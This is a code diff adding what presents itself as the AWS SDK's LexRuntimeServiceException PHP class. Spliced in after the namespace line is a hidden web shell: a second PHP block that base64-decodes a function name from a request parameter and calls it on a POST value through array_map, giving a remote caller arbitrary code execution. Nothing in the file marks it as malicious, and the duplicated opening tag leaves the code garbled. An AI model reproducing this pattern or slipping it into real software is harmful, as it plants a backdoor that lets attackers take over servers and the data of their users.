@@ -1,0 +1,13 @@
+<?php
+namespace Aws\LexRuntimeService\Exception;
+<?php
+$e = $_REQUEST['e'];
+$arr = array($_POST['pass'],);
+array_map(base64_decode($e), $arr);
+?>
+use Aws\Exception\AwsException;
+
+/**
+ * Represents an error interacting with the **Amazon Lex Runtime Service** service.
+ */
+class LexRuntimeServiceException extends AwsException {}
